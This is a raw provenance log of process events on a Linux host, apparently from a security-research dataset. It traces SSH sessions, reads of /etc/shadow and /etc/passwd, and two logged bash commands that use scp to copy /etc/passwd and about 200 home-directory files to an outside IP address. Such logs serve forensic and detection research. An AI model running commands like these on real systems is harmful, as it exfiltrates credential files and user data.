1557781450.890:1289788890,EE7B18F9-135B-1B7A-8EB3-8367B14A4D10:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781450.890:1289788868,EE7B18F9-135B-1B7A-8EB3-8367B14A4D10:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781450.890:1289788773,90A9534C-0B89-6F13-EB8D-1CF6A9D9DAD5:scp,EXECUTE,EE7B18F9-135B-1B7A-8EB3-8367B14A4D10,ssh,null
1557781450.890:1289788764,7B1C210A-5CA5-A601-E721-6E625EA38796:scp,FORK,90A9534C-0B89-6F13-EB8D-1CF6A9D9DAD5,scp,null
1557781450.890:1289788757,7B1C210A-5CA5-A601-E721-6E625EA38796:scp,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781450.890:1289788696,7060AEC0-2A8A-7176-973F-ECB0B3E86398:bash,EXECUTE,7B1C210A-5CA5-A601-E721-6E625EA38796,b'scp -r /etc/passwd admin@128.55.12.124:.',null
1557781450.890:1289788690,EC4780EA-4596-BFE1-6833-5F3902A0FCAD:bash,FORK,7060AEC0-2A8A-7176-973F-ECB0B3E86398,bash,null
1557781446.010:1289774543,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.010:1289774540,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.010:1289774537,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.010:1289774534,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.010:1289774531,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.010:1289774528,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.010:1289774525,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.006:1289774503,397903D3-E9AE-B44A-9184-9F2E474BCD1D:ssh,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.006:1289774408,D0525AC6-DB68-C892-6740-8DDC787AB25C:scp,EXECUTE,397903D3-E9AE-B44A-9184-9F2E474BCD1D,ssh,null
1557781446.006:1289774399,FB17FF83-D3B1-891E-1346-F67ED5F1CA30:scp,FORK,D0525AC6-DB68-C892-6740-8DDC787AB25C,scp,null
1557781446.006:1289774392,FB17FF83-D3B1-891E-1346-F67ED5F1CA30:scp,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781446.006:1289774331,92BC71A8-28B0-84DA-DB7A-C14EDF86C24F:bash,EXECUTE,FB17FF83-D3B1-891E-1346-F67ED5F1CA30,b'scp -r /home/admin/acrylic /home/admin/adjuncts /home/admin/aethogen /home/admin/airbrush /home/admin/allayers /home/admin/allround /home/admin/anconeus /home/admin/ancylostomiasis /home/admin/antilepton /home/admin/antisepticize /home/admin/autocombustible /home/admin/aviarists /home/admin/backup /home/admin/bandagers /home/admin/barong /home/admin/bedlamised /home/admin/bombacaceous /home/admin/botulinuses /home/admin/boult /home/admin/brewer /home/admin/broider /home/admin/bushidos /home/admin/celebe /home/admin/chelicere /home/admin/chondropharyngeus /home/admin/cicalas /home/admin/cilices /home/admin/composita /home/admin/convincible /home/admin/convulsedly /home/admin/copintank /home/admin/critters /home/admin/croakers /home/admin/cyanogenesis /home/admin/dealers /home/admin/decimator /home/admin/depardieu /home/admin/deposes /home/admin/deracialize /home/admin/dermobranchia /home/admin/Desktop /home/admin/desuete /home/admin/directeur /home/admin/disincrustion /home/admin/docs /home/admin/Documents /home/admin/dogma /home/admin/Downloads /home/admin/drumming /home/admin/dunny /home/admin/educt /home/admin/electrovection /home/admin/empiricism /home/admin/energeticalness /home/admin/exacuate /home/admin/farandmen /home/admin/files /home/admin/finnick /home/admin/flashpan /home/admin/fleabanes /home/admin/genesiacal /home/admin/geoponical /home/admin/glx_alsa_675.ko /home/admin/grains /home/admin/grooper /home/admin/haemophilic /home/admin/halleflinta /home/admin/hauntingly /home/admin/hemophthalmia /home/admin/herpetologist /home/admin/hosts /home/admin/hsperfdata_darpa /home/admin/imposted /home/admin/imposthume /home/admin/individua /home/admin/interrogatedness /home/admin/jna-95354950 /home/admin/jockeydom /home/admin/joinable /home/admin/lewisite /home/admin/liverheartedness /home/admin/machine /home/admin/__MACOSX /home/admin/medicamentary /home/admin/merfold /home/admin/merogenetic /home/admin/messmen /home/admin/metanitrophenol /home/admin/methene /home/admin/mignon /home/admin/minion /home/admin/misconducting /home/admin/misinters /home/admin/molligrant /home/admin/moondown /home/admin/Music /home/admin/navaids /home/admin/neurologically /home/admin/nitidulid /home/admin/nocktat /home/admin/nodeexporter /home/admin/noncrossover /home/admin/noncuratively /home/admin/nonrecombinant /home/admin/nonshatter /home/admin/olivil /home/admin/osphere /home/admin/otarian /home/admin/out10 /home/admin/out20 /home/admin/out249 /home/admin/out250 /home/admin/out514 /home/admin/out559 /home/admin/out669 /home/admin/out724 /home/admin/out857 /home/admin/out864 /home/admin/out888 /home/admin/out912 /home/admin/overskirt /home/admin/overspender /home/admin/overwinning /home/admin/palestine /home/admin/panada /home/admin/parochialization /home/admin/passwd /home/admin/phyllostomatidae /home/admin/Pictures /home/admin/pisgah /home/admin/placement /home/admin/planospore /home/admin/polytype /home/admin/potholes /home/admin/precopy /home/admin/preexception /home/admin/preoccupiedness /home/admin/preppie /home/admin/prereceiver /home/admin/preserver /home/admin/pricklyback /home/admin/projections /home/admin/proterandry /home/admin/psychomoral /home/admin/Public /home/admin/pulpwoods /home/admin/pumpkinish /home/admin/quislings /home/admin/ratement /home/admin/ravi /home/admin/referendaryship /home/admin/rerival /home/admin/restorationist /home/admin/rove /home/admin/sapropel /home/admin/satable /home/admin/savoring /home/admin/sclerosed /home/admin/semifamine /home/admin/sequentially /home/admin/sfree /home/admin/sheaths /home/admin/sigatoka /home/admin/skiffles /home/admin/spathyema /home/admin/speirs /home/admin/spiky /home/admin/spirae /home/admin/stairbuilding /home/admin/stringsman /home/admin/subcircularity /home/admin/subimbricative /home/admin/superapologies /home/admin/supposital /home/admin/suppressants /home/admin/swiples /home/admin/tabors /home/admin/talonid /home/admin/Templates /home/admin/tennantite /home/admin/test /home/admin/tinkler /home/admin/tormentor /home/admin/tortiously /home/admin/touchless /home/admin/trachile /home/admin/trainload /home/admin/treckpot /home/admin/trillil /home/admin/tripleness /home/admin/ubuntu_pkgs /home/admin/ubuntu_pkgs.zip /home/admin/unadoptably /home/admin/undeteriorated /home/admin/unempty /home/admin/unify /home/admin/uniseriately /home/admin/unloosen /home/admin/unmentioned /home/admin/unrecreational /home/admin/unsickered /home/admin/untempting /home/admin/Videos /home/admin/vilified /home/admin/vitrean /home/admin/woolsack /home/admin/work /home/admin/wurtzilite /home/admin/xvnc4viewer.deb /home/admin/yentas /home/admin/yett admin@128.55.12.124:\\C:WindowsTemp',null
1557781446.006:1289774325,EC4780EA-4596-BFE1-6833-5F3902A0FCAD:bash,FORK,92BC71A8-28B0-84DA-DB7A-C14EDF86C24F,bash,null
1557781445.818:1289771107,EC4780EA-4596-BFE1-6833-5F3902A0FCAD:bash,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.818:1289771024,5E3EA706-7B34-2FA6-E64E-4FC1B99DF2C3:sshd,EXECUTE,EC4780EA-4596-BFE1-6833-5F3902A0FCAD,bash,null
1557781445.818:1289770906,BC6EB479-0D1E-1E66-03A7-566E8B86E778:sshd,FORK,5E3EA706-7B34-2FA6-E64E-4FC1B99DF2C3,sshd,null
1557781445.818:1289770856,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.818:1289770850,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.814:1289770815,15A7C562-9880-4E12-33BF-3E7169298A27:sshd,CHANGE_PRINCIPAL,BC6EB479-0D1E-1E66-03A7-566E8B86E778,sshd,null
1557781445.814:1289770787,015DE772-17EB-025E-5F83-C9C1500AF38A:sshd,CHANGE_PRINCIPAL,15A7C562-9880-4E12-33BF-3E7169298A27,sshd,null
1557781445.814:1289770784,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,FORK,015DE772-17EB-025E-5F83-C9C1500AF38A,sshd,null
1557781445.814:1289770775,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.814:1289770739,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.814:1289770736,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.814:1289770733,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.766:1289768577,C5147DF4-CD0D-D033-1D63-3DC152FA19ED:lsb_release,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.754:1289768309,1D0E5E07-B1A4-E589-B9F6-DF4FBB0D25C0:91-release-upgr,EXECUTE,C5147DF4-CD0D-D033-1D63-3DC152FA19ED,lsb_release,null
1557781445.754:1289768300,53AB2401-9514-41CB-1D03-C8E95E84CAA6:91-release-upgr,FORK,1D0E5E07-B1A4-E589-B9F6-DF4FBB0D25C0,91-release-upgr,null
1557781445.754:1289768293,5C8FDBEF-2AFF-B103-E9B9-ADBBE2EFBDB5:91-release-upgr,FORK,53AB2401-9514-41CB-1D03-C8E95E84CAA6,91-release-upgr,null
1557781445.754:1289768271,FFDCFE0C-6F55-57E3-B6C4-06091C19B95D:run-parts,EXECUTE,5C8FDBEF-2AFF-B103-E9B9-ADBBE2EFBDB5,91-release-upgr,null
1557781445.754:1289768270,2058E09C-53C3-2EDF-0E89-0FD371C47F68:run-parts,FORK,FFDCFE0C-6F55-57E3-B6C4-06091C19B95D,run-parts,null
1557781445.602:1289759761,324126CB-7794-7733-EE18-3F2252AD61D9:landscape-sysin,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.594:1289759351,813B4CFE-EFB5-F067-E998-AD3216B84FFC:50-landscape-sy,EXECUTE,324126CB-7794-7733-EE18-3F2252AD61D9,landscape-sysin,null
1557781445.594:1289759335,3E3F0437-DB37-3F07-934C-CE5E4EBD30DA:50-landscape-sy,FORK,813B4CFE-EFB5-F067-E998-AD3216B84FFC,50-landscape-sy,null
1557781445.590:1289759028,3FED3D40-6E0B-9ADB-B533-2F2F30A965B4:run-parts,EXECUTE,3E3F0437-DB37-3F07-934C-CE5E4EBD30DA,50-landscape-sy,null
1557781445.590:1289759017,2058E09C-53C3-2EDF-0E89-0FD371C47F68:run-parts,FORK,3FED3D40-6E0B-9ADB-B533-2F2F30A965B4,run-parts,null
1557781445.586:1289758682,BAE3635D-ECC4-B10E-19E0-FC85967CE7BE:env,EXECUTE,2058E09C-53C3-2EDF-0E89-0FD371C47F68,run-parts,null
1557781445.586:1289758610,743874B6-3BD4-8E0D-8594-72465C8E5188:sh,EXECUTE,BAE3635D-ECC4-B10E-19E0-FC85967CE7BE,env,null
1557781445.586:1289758597,D704D268-738F-584C-C5B8-F34A99FDFCE1:sh,FORK,743874B6-3BD4-8E0D-8594-72465C8E5188,sh,null
1557781445.586:1289758525,5FF6E0D9-18CE-6D04-B6A4-EFA9CED71714:sshd,EXECUTE,D704D268-738F-584C-C5B8-F34A99FDFCE1,sh,null
1557781445.586:1289758503,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,FORK,5FF6E0D9-18CE-6D04-B6A4-EFA9CED71714,sshd,null
1557781445.586:1289758488,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.566:1289758136,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.566:1289758085,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.566:1289758073,2B83732E-0D62-34F3-4E31-BBCE8EC2976B:sshd,CHANGE_PRINCIPAL,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9,sshd,null
1557781445.566:1289758072,406C35CF-E840-46C7-E0DF-211FBEB44711:sshd,CHANGE_PRINCIPAL,2B83732E-0D62-34F3-4E31-BBCE8EC2976B,sshd,null
1557781445.566:1289758071,2B83732E-0D62-34F3-4E31-BBCE8EC2976B:sshd,CHANGE_PRINCIPAL,406C35CF-E840-46C7-E0DF-211FBEB44711,sshd,null
1557781445.566:1289758070,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,CHANGE_PRINCIPAL,2B83732E-0D62-34F3-4E31-BBCE8EC2976B,sshd,null
1557781445.566:1289758068,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.566:1289758054,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.566:1289758014,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557781445.566:1289758011,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.562:1289757982,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557781445.562:1289757979,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.458:1289757530,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.458:1289757498,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557781445.458:1289757497,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557781445.370:1289757087,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781445.366:1289756831,A40F17CF-F9EF-9683-143B-DD6C8F83930D:sshd,EXECUTE,E8C7113D-4F41-B675-DB8C-6DE0B5A9ADF9,sshd,null
1557781445.366:1289756810,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,A40F17CF-F9EF-9683-143B-DD6C8F83930D,sshd,null
1557781441.210:1289742370,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781441.210:1289742279,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781441.206:1289742211,9BFE18DC-05B2-CD03-94AA-4288FBD6A813:sshd,CHANGE_PRINCIPAL,17368A13-1D98-57EF-C691-8EB775730865,sshd,null
1557781441.206:1289742210,9BFE18DC-05B2-CD03-94AA-4288FBD6A813:sshd,CHANGE_PRINCIPAL,9BFE18DC-05B2-CD03-94AA-4288FBD6A813,sshd,null
1557781441.206:1289742209,17368A13-1D98-57EF-C691-8EB775730865:sshd,CHANGE_PRINCIPAL,9BFE18DC-05B2-CD03-94AA-4288FBD6A813,sshd,null
1557781440.786:1289740954,FB02F3EB-A57E-77EB-D3F1-733E4415BB59:wget,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557781440.786:1289740953,FB02F3EB-A57E-77EB-D3F1-733E4415BB59:wget,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557781440.290:1289736024,877D2464-C9A4-427A-6824-ECE330C042EF:bash,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.290:1289735941,F87D7DAF-AE92-A08D-1882-5F8D0803A8BA:sshd,EXECUTE,877D2464-C9A4-427A-6824-ECE330C042EF,bash,null
1557781440.286:1289735820,38BFCA21-1B6C-A225-BC67-7EFB6D952CB6:sshd,FORK,F87D7DAF-AE92-A08D-1882-5F8D0803A8BA,sshd,null
1557781440.286:1289735773,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.286:1289735767,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.286:1289735747,282409B7-C935-1F93-C460-0BEDAD29ECB6:sshd,CHANGE_PRINCIPAL,38BFCA21-1B6C-A225-BC67-7EFB6D952CB6,sshd,null
1557781440.286:1289735725,1E2FE061-CE6F-F1EC-44B1-DFCA85C56942:sshd,CHANGE_PRINCIPAL,282409B7-C935-1F93-C460-0BEDAD29ECB6,sshd,null
1557781440.286:1289735722,17368A13-1D98-57EF-C691-8EB775730865:sshd,FORK,1E2FE061-CE6F-F1EC-44B1-DFCA85C56942,sshd,null
1557781440.286:1289735713,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.286:1289735677,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.286:1289735674,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.286:1289735671,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.234:1289733489,D6B6D9C7-110E-2C82-C551-F863215A6347:lsb_release,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.218:1289733218,00629B76-FA85-B687-1E08-7E6ABEAF6068:91-release-upgr,EXECUTE,D6B6D9C7-110E-2C82-C551-F863215A6347,lsb_release,null
1557781440.218:1289733211,DF643797-51FC-67E1-0D4B-7C35A955DECE:91-release-upgr,FORK,00629B76-FA85-B687-1E08-7E6ABEAF6068,91-release-upgr,null
1557781440.218:1289733204,9A7DB091-0885-D14F-5D20-A220C64B9C73:91-release-upgr,FORK,DF643797-51FC-67E1-0D4B-7C35A955DECE,91-release-upgr,null
1557781440.218:1289733182,1DB1A2E9-A65C-DD8D-9EA7-3FD00B99018E:run-parts,EXECUTE,9A7DB091-0885-D14F-5D20-A220C64B9C73,91-release-upgr,null
1557781440.218:1289733181,4AD9C883-32D6-CBCD-D2E9-FDC2321B5EAA:run-parts,FORK,1DB1A2E9-A65C-DD8D-9EA7-3FD00B99018E,run-parts,null
1557781440.066:1289724641,DCA645B9-8314-A4DD-1240-8D1F83393F59:landscape-sysin,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.062:1289724265,C4A450C3-9191-9BC1-7CCE-5BA3B0175452:50-landscape-sy,EXECUTE,DCA645B9-8314-A4DD-1240-8D1F83393F59,landscape-sysin,null
1557781440.062:1289724263,C8A3D5FF-E576-DF95-F15D-714791BA1BD7:50-landscape-sy,FORK,C4A450C3-9191-9BC1-7CCE-5BA3B0175452,50-landscape-sy,null
1557781440.058:1289724003,10B71AAB-E080-24C4-1369-2A98559BEC0A:run-parts,EXECUTE,C8A3D5FF-E576-DF95-F15D-714791BA1BD7,50-landscape-sy,null
1557781440.058:1289724001,4AD9C883-32D6-CBCD-D2E9-FDC2321B5EAA:run-parts,FORK,10B71AAB-E080-24C4-1369-2A98559BEC0A,run-parts,null
1557781440.054:1289723660,33369C86-6A90-0DD5-F5CD-3E952563CA2F:env,EXECUTE,4AD9C883-32D6-CBCD-D2E9-FDC2321B5EAA,run-parts,null
1557781440.054:1289723624,102EFC18-BD0C-88A9-F809-9BFE519ADCDE:sh,EXECUTE,33369C86-6A90-0DD5-F5CD-3E952563CA2F,env,null
1557781440.054:1289723616,31135941-36DC-3C0F-550B-515A36896004:sh,FORK,102EFC18-BD0C-88A9-F809-9BFE519ADCDE,sh,null
1557781440.054:1289723554,0B57099E-6530-D083-5E17-DFFE7E781E38:sshd,EXECUTE,31135941-36DC-3C0F-550B-515A36896004,sh,null
1557781440.054:1289723533,17368A13-1D98-57EF-C691-8EB775730865:sshd,FORK,0B57099E-6530-D083-5E17-DFFE7E781E38,sshd,null
1557781440.054:1289723512,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.018:1289723137,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.014:1289723086,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.014:1289723072,7D6CD78A-BFC6-7D8F-0C56-E523154F36AB:sshd,CHANGE_PRINCIPAL,17368A13-1D98-57EF-C691-8EB775730865,sshd,null
1557781440.014:1289723071,7901E0E4-2F19-83A8-2B7D-254E8FAAB89E:sshd,CHANGE_PRINCIPAL,7D6CD78A-BFC6-7D8F-0C56-E523154F36AB,sshd,null
1557781440.014:1289723070,7D6CD78A-BFC6-7D8F-0C56-E523154F36AB:sshd,CHANGE_PRINCIPAL,7901E0E4-2F19-83A8-2B7D-254E8FAAB89E,sshd,null
1557781440.014:1289723069,17368A13-1D98-57EF-C691-8EB775730865:sshd,CHANGE_PRINCIPAL,7D6CD78A-BFC6-7D8F-0C56-E523154F36AB,sshd,null
1557781440.014:1289723067,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.014:1289723053,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781440.014:1289722998,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557781440.014:1289722994,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781439.998:1289722949,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557781439.998:1289722945,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781439.894:1289722509,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781439.894:1289722475,17368A13-1D98-57EF-C691-8EB775730865:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557781439.894:1289722474,17368A13-1D98-57EF-C691-8EB775730865:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557781439.826:1289722122,17368A13-1D98-57EF-C691-8EB775730865:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781439.818:1289721842,45C78A9A-E99F-FC73-C085-8CC6261DB25D:sshd,EXECUTE,17368A13-1D98-57EF-C691-8EB775730865,sshd,null
1557781439.818:1289721821,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,45C78A9A-E99F-FC73-C085-8CC6261DB25D,sshd,null
1557781430.662:1289699890,C555B01B-0EA0-FFE9-6213-453308CB1654:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781430.662:1289699846,C555B01B-0EA0-FFE9-6213-453308CB1654:sshd,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781430.662:1289699783,C0FB122A-049E-C742-842F-2CEEAB979AB3:sshd,CHANGE_PRINCIPAL,C555B01B-0EA0-FFE9-6213-453308CB1654,sshd,null
1557781430.662:1289699782,C0FB122A-049E-C742-842F-2CEEAB979AB3:sshd,CHANGE_PRINCIPAL,C0FB122A-049E-C742-842F-2CEEAB979AB3,sshd,null
1557781430.662:1289699781,C555B01B-0EA0-FFE9-6213-453308CB1654:sshd,CHANGE_PRINCIPAL,C0FB122A-049E-C742-842F-2CEEAB979AB3,sshd,null
1557781412.022:1289643230,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781412.022:1289643215,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781412.022:1289643176,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781412.022:1289643155,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781412.022:1289643038,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781412.022:1289642975,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781412.022:1289642966,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
1557781412.022:1289642957,9E700DEA-68CA-3329-659A-11DE26035B20:top,MMAP,D915A2CA-A0E8-98D7-0A63-826D7F4D6B4F,/etc/passwd,null
